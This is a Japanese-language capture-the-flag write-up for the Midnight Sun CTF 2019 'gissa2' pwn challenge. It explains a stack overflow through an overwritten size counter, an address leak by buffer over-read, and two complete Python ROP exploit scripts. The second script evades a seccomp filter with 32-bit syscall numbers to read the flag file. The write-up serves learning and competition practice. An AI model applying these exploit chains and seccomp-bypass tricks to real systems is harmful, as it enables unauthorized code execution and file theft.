# [pwn 631pts] gissa2 - Midnight Sun CTF 2019 Quals
64ビットバイナリで、libcは使わずsyscallで各種関数を実装しています。
```
$ checksec -f gissa_igen
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      No	0		0	gissa_igen
```
ざっくり読むと、flagをmmapした領域に読み込み、ユーザーが3回まで入力し、flagと一致しているかを確認しています。
何も入力しないとカウンタは進まず（というか失敗カウンタが増えて）絶対に3回は入力できます。
SSPだけ無効ということで、オーバーフローが怪しいのでとりあえず入力を受け付けている関数を見てみます。

入力を受け付ける関数は改行もしくは指定されたサイズまでreadします。
また、このサイズはmain関数から渡されており、スタック上に初期状態で0x8bとして存在します。
一方バッファはちゃんと0x8cバイト取られているのでオーバーフローはありません。
しかし、何も入力しないと増えるカウンタが隣接しており、かつサイズはintとして読み込まれるため、最初に何も入力しないと次に0x1008bバイト入力できます。

```
flag (1/3): 
try again.
flag (1/3): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not right.
Segmentation fault (コアダンプ)
```

また、writeするサイズはstrlenで計算されるので、バッファオーバーリードによりproc baseが取れます。
しかし、改行文字が入るとNULLに置き換えられてしまうので、最初はsizeを0xa8にし、2回目に限度ぎりぎりまで入力してオーバーリードします。
あと普通のカウンタもスタック上にあるので、miscntとcntを上手く書き換えてループを抜けないように注意しましょう。
（`cnt <= miscnt + 3`ならOKなのでcntを負の値にします。）
libcが使われていないので適当にROPしてシェルを取る必要があります。

次のようにROPできます。
```python
from ptrlib import *

sock = Process("./gissa_igen")

sock.recvuntil(": ")
sock.sendline("")

# prepare for overread
payload = b'A' * 0x8c
payload += p32(0xa8) # size
sock.recvuntil(": ")
sock.sendline(payload)

_ = input()
# leak proc base
payload = b'A' * 0x8c
payload += p16(0xbeef) # size
payload += p16(0x7fad) # miscnt
payload += b'A' * 8
payload += p64(0x893fffff01010101) # cnt
payload += b'A' * 8
sock.recvuntil(": ")
sock.sendline(payload)
result = sock.recvuntil(" is not right.")
addr_main_ret = u64(result.rstrip(b" is not right.")[-6:])
proc_base = addr_main_ret - 0xbc5
dump("proc base = " + hex(proc_base))

rop_pop_rax_rdi_rsi = proc_base + 0xc21
rop_pop_rdx_r9_r8_rdi_rsi = proc_base + 0xc1d
rop_syscall = proc_base + 0xbd9

# get the shell!
payload = b'A' * 0x8c
payload += p32(0xdeadbeef) # size
payload += b'A' * 0x18

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(8)                  # count
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(0)                    # SYS_read
payload += p64(0)                    # stdin
payload += p64(proc_base + 0x202000) # buf
payload += p64(rop_syscall)          # syscall; ret;

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(0)                  # envp
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(59)                   # SYS_execve
payload += p64(proc_base + 0x202000) # /bin/sh
payload += p64(0)                    # argv
payload += p64(rop_syscall)          # syscall; ret;

_ = input()
sock.recvuntil(": ")
sock.sendline(payload)

sock.send("/bin/sh\x00")

sock.interactive()
```

これで万事休すと思いきや罠がありました。

```
[15460.544038] audit: type=1326 audit(1557321134.524:45): auid=1000 uid=1000 gid=1000 ses=3 subj==unconfined pid=19218 comm="gissa_igen" exe="/home/ptr/colony/writeups/2019/Midnight_Sun_CTF_2019_Quals/gissa2/gissa_igen" sig=31 arch=c000003e syscall=59 compat=0 ip=0x55806eebabdb code=0x0
```

はー、seccompが有効やん。完全に忘れてた。
seccomp-toolsにかけます。
```
$ seccomp-tools dump ./gissa_igen
...

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

openとかも無効にされてますね。
ptraceで回避みたいなのを思いつきましたがforkが禁止されているので、32bitのシステムコールを使いましょう。
0x40000000を足せば利用できます。
起動時にstatしているパスからフラグが`/home/ctf/flag`にあることが分かります。
これをopen, read, writeしてやりましょう。
（ローカルでやってるのでフラグは自分で用意します。）

```python
from ptrlib import *

sock = Process("./gissa_igen")

sock.recvuntil(": ")
sock.sendline("")

# prepare for overread
payload = b'A' * 0x8c
payload += p32(0xa8) # size
sock.recvuntil(": ")
sock.sendline(payload)

_ = input()
# leak proc base
payload = b'A' * 0x8c
payload += p16(0xbeef) # size
payload += p16(0x7fad) # miscnt
payload += b'A' * 8
payload += p64(0x893fffff01010101) # cnt
payload += b'A' * 8
sock.recvuntil(": ")
sock.sendline(payload)
result = sock.recvuntil(" is not right.")
addr_main_ret = u64(result.rstrip(b" is not right.")[-6:])
proc_base = addr_main_ret - 0xbc5
dump("proc base = " + hex(proc_base))

rop_pop_rax_rdi_rsi = proc_base + 0xc21
rop_pop_rdx_r9_r8_rdi_rsi = proc_base + 0xc1d
rop_syscall = proc_base + 0xbd9

# get the shell!
payload = b'A' * 0x8c
payload += p32(0xdeadbeef) # size
payload += b'A' * 0x18

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(16)                   # count
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(0)                    # SYS_read
payload += p64(0)                    # stdin
payload += p64(proc_base + 0x202000) # buf
payload += p64(rop_syscall)          # syscall; ret;

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(0)                    # mode
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(0x40000002)           # SYS_open
payload += p64(proc_base + 0x202000) # filename
payload += p64(0b1000)               # flags (O_RDONlY | O_TExT)
payload += p64(rop_syscall)          # syscall; ret;

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(0x100)                # count
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(0)                    # SYS_read
payload += p64(3)                    # fd = 3 maybe?
payload += p64(proc_base + 0x202000) # buf
payload += p64(rop_syscall)          # syscall; ret;

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(0x100)                # count
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(1)                    # SYS_write
payload += p64(1)                    # stdout
payload += p64(proc_base + 0x202000) # buf
payload += p64(rop_syscall)          # syscall; ret;

_ = input()
sock.recvuntil(": ")
sock.sendline(payload)

sock.send(b"/home/ctf/flag\x00")

sock.interactive()
```

できたー。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=20642)

[ptrlib] proc base = 0x55f610bdb000

[ptrlib]$ try again.
flag (16810325/3): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¾­ÞAAAAAAAAAAAAAAAAAAAAAAAA¼½öU is not right.
FLAG{123}
flag[-] Process './gissa_igen' stopped with exit code -11 (PID=20642)
```

# 感想
ひと工夫必要で面白かったです。

# 参考文献
[1] [https://kileak.github.io/ctf/2019/midnight-gissa2/](https://kileak.github.io/ctf/2019/midnight-gissa2/)